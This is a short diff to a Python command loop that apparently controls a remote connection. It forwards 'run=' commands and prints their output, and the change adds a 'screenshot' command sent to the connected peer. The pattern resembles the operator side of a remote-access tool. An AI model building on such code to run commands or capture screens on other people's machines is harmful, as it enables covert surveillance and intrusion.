@@ -17,7 +17,9 @@ while True:
     elif inp.startswith("run="):
         conn.send(inp.encode())
         print((conn.recv(1024)).decode())
-    elif inp=='':
+    elif inp=="screenshot":
+        conn.send(b"screenshot")
+    elif inp=="":
         pass
     else:
         print("Enter right command")
